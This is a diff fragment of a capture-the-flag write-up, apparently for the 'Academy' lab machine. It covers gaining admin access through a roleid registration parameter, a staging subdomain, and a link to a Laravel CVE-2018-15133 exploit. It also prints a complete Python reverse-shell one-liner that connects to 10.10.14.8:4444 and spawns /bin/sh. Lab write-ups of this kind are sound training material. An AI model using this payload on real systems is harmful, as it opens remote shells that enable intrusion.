@@ -22,6 +22,10 @@ There is roleid parameter in registry form request. Some experiments with it let
 ****
 ![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/Adm%20register%20new.png)
 
+Now we can login as created user on admin.php
+![alt_text](https://github.com/Healops/Writeups/blob/main/Academy/Images/Academy%20louch%20panel.PNG)
+
+There is interesting web page dev-staging-01.academy.htb, we can add it to /etc/host and check its content
 <https://github.com/aljavier/exploit_laravel_cve-2018-15133>
 
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
